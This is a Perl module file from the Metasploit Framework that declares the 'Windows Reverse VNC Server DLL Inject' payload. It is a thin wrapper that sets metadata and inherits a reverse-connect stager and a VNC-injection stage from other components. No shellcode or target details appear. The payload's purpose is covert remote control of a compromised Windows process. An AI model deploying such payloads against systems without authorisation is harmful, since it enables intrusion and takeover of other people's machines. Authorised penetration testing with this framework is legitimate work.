
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_vncinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectVncStage';
use FindBin qw{$RealBin};

sub load {
  Msf::PayloadComponent::Win32InjectVncStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
  'Name'         => 'Windows Reverse VNC Server DLL Inject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back and inject a VNC server into the remote process',
                
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
